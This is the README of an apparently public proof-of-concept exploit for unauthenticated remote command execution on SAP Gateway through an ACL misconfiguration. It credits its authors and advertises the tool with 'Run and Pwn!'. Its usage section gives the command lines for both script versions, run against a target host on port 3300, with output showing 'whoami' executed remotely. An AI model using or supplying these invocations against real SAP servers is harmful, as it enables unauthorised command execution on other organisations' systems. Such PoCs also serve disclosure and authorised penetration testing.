## What is it?

PoC that exploits ACL misconfiguration in SAP Gateway (port 33xx) leads to Remote Command Execution (RCE)

`SAPanonGWv1.py` is first version of exploit based raw packets. Doesn't require any additional modules (Run and Pwn!).

`SAPanonGWv2.py` is second version of exploit based on [pysap](https://github.com/SecureAuthCorp/pysap) library.

## Creds

This Poc was developed by Dmitry [@_chipik](https://twitter.com/_chipik) Chastuhin 


## How to use

```bash
➜python SAPanonGWv1.py -t 172.16.30.28 -p 3300 -c whoami
[*] sending cmd:whoami
n45adm
```


```bash
➜python SAPanonGWv2.py -t <ip> -p 3300 -c whoami
[INFO ] [+] Sending GW_NORMAL_CLIENT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_INIT
[INFO ] Response: OK
[INFO ] [+] Sending F_SAP_SEND
[INFO ] [+] Sending F_SAP_SEND2
n45adm
```

### Contributors

Contributions made by:

  * Dmitry Chastuhin ([@_chipik](https://twitter.com/_chipik))
  * Mathieu Geli ([@gelim](https://github.com/gelim))
